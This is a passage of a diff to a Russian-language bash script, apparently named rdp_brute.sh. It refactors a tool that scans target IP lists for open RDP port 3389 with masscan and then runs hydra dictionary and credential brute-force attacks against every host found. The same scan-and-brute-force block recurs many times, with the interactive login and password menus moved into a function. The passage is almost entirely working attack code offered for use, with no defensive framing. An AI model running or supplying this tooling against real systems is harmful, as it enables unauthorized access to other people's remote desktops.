-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5075,6 +2177,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5084,53 +2187,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5148,6 +2205,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5157,53 +2215,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5221,6 +2233,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5230,53 +2243,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5294,6 +2261,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5303,53 +2271,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5367,6 +2289,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5376,53 +2299,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5440,6 +2317,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5449,53 +2327,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5513,6 +2345,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5522,53 +2355,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5586,6 +2373,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5595,53 +2383,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5659,6 +2401,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5668,53 +2411,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5732,6 +2429,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5741,53 +2439,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5805,6 +2457,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5814,53 +2467,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5878,6 +2485,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5887,53 +2495,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -5951,6 +2513,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5960,53 +2523,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6024,6 +2541,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
